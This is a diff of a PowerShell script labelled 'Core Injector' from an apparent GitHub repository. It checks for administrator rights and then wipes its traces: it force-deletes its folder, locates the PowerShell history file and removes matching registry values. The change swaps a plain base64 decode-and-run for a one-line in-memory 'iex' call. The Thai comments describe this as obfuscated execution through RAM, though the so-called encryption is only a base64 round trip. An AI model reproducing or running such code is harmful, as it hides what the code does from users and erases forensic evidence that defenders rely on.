@@ -1,5 +1,5 @@
 # ---------------------------------------------------------
-# Core Injector Logic - GitHub: getx796-Harem
+# Core Injector (Encrypted) - GitHub: getx796-Harem
 # ---------------------------------------------------------
 $c = @"
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -30,6 +30,5 @@ Sleep 5;rm `$d -Recurse -Force -EA 0;`$h=(Get-PSReadLineOption).HistorySavePath;
 Get-Item `$m -EA 0|% {`$_.Property}|? {`$_ -like "*`$f*"}|% {Remove-ItemProperty `$m -Name `$_ -Force -EA 0}
 "@
 
-# เข้ารหัสและรัน (ล็อคโค้ดดิบ)
-$b = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($c))
-iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))
+# บีบอัดและรันผ่าน RAM (Obfuscated)
+iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($c)))))
